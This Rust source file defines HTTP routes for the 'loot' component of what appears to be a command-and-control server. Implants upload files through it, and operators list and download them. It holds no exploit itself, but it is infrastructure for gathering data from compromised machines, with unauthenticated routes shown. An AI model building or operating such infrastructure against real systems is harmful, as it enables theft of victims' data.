use crate::core::implants::parse_agent_id;
use crate::state::AppState;
use axum::{
    body::Body,
    extract::{Multipart, Path, State},
    http::{header, StatusCode},
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde_json::json;

pub fn routes(state: AppState) -> Router {
    Router::new()
        .route("/api/loot", get(list_all_loot))
        .route("/api/loot/upload", post(upload_loot))
        .route("/api/loot/:id", get(get_loot))
        .route("/api/loot/:id/download", get(download_loot))
        .route("/api/implants/:agent_id/loot", get(list_implant_loot))
        .with_state(state)
}

async fn list_all_loot(State(state): State<AppState>) -> impl IntoResponse {
    match state.db.list_loot() {
        Ok(rows) => {
            let items: Vec<_> = rows
                .iter()
                .map(|r| {
                    json!({
                        "id": r.id,
                        "agent_id": hex::encode(r.agent_id),
                        "loot_type": r.loot_type,
                        "filename": r.filename,
                        "size_bytes": r.size_bytes,
                        "created_at": r.created_at,
                    })
                })
                .collect();
            (StatusCode::OK, Json(json!({ "loot": items })))
        }
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

async fn list_implant_loot(
    State(state): State<AppState>,
    Path(agent_id): Path<String>,
) -> impl IntoResponse {
    let id = match parse_agent_id(&agent_id) {
        Ok(id) => id,
        Err(_) => {
            return (
                StatusCode::BAD_REQUEST,
                Json(json!({ "error": "invalid agent_id" })),
            )
        }
    };
    match state.db.list_loot_for_implant(&id) {
        Ok(rows) => {
            let items: Vec<_> = rows
                .iter()
                .map(|r| {
                    json!({
                        "id": r.id,
                        "agent_id": hex::encode(r.agent_id),
                        "loot_type": r.loot_type,
                        "filename": r.filename,
                        "size_bytes": r.size_bytes,
                        "created_at": r.created_at,
                    })
                })
                .collect();
            (StatusCode::OK, Json(json!({ "loot": items })))
        }
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

async fn get_loot(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> impl IntoResponse {
    match state.db.get_loot(id) {
        Ok(Some(r)) => (
            StatusCode::OK,
            Json(json!({
                "id": r.id,
                "agent_id": hex::encode(r.agent_id),
                "loot_type": r.loot_type,
                "filename": r.filename,
                "size_bytes": r.size_bytes,
                "created_at": r.created_at,
            })),
        ),
        Ok(None) => (
            StatusCode::NOT_FOUND,
            Json(json!({ "error": "not found" })),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

async fn download_loot(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> impl IntoResponse {
    match state.files.read_file(id) {
        Ok((filename, data)) => {
            let disposition = format!("attachment; filename=\"{}\"", filename);
            (
                StatusCode::OK,
                [
                    (header::CONTENT_DISPOSITION, disposition),
                    (
                        header::CONTENT_TYPE,
                        "application/octet-stream".to_string(),
                    ),
                ],
                Body::from(data),
            )
                .into_response()
        }
        Err(e) => (StatusCode::NOT_FOUND, Json(json!({ "error": e }))).into_response(),
    }
}

async fn upload_loot(
    State(state): State<AppState>,
    mut multipart: Multipart,
) -> impl IntoResponse {
    let mut agent_id_str = String::new();
    let mut loot_type = "files".to_string();
    let mut filename = String::new();
    let mut file_data = Vec::new();

    while let Ok(Some(field)) = multipart.next_field().await {
        let name = field.name().unwrap_or("").to_string();
        match name.as_str() {
            "agent_id" => {
                agent_id_str = field.text().await.unwrap_or_default();
            }
            "loot_type" => {
                loot_type = field.text().await.unwrap_or_default();
            }
            "file" => {
                filename = field
                    .file_name()
                    .unwrap_or("upload.bin")
                    .to_string();
                file_data = field.bytes().await.unwrap_or_default().to_vec();
            }
            _ => {}
        }
    }

    if agent_id_str.is_empty() || file_data.is_empty() {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({ "error": "agent_id and file required" })),
        );
    }

    let id = match parse_agent_id(&agent_id_str) {
        Ok(id) => id,
        Err(_) => {
            return (
                StatusCode::BAD_REQUEST,
                Json(json!({ "error": "invalid agent_id" })),
            )
        }
    };

    match state.files.store_file(&id, &loot_type, &filename, &file_data) {
        Ok(loot_id) => (
            StatusCode::OK,
            Json(json!({ "loot_id": loot_id, "filename": filename, "size": file_data.len() })),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e })),
        ),
    }
}
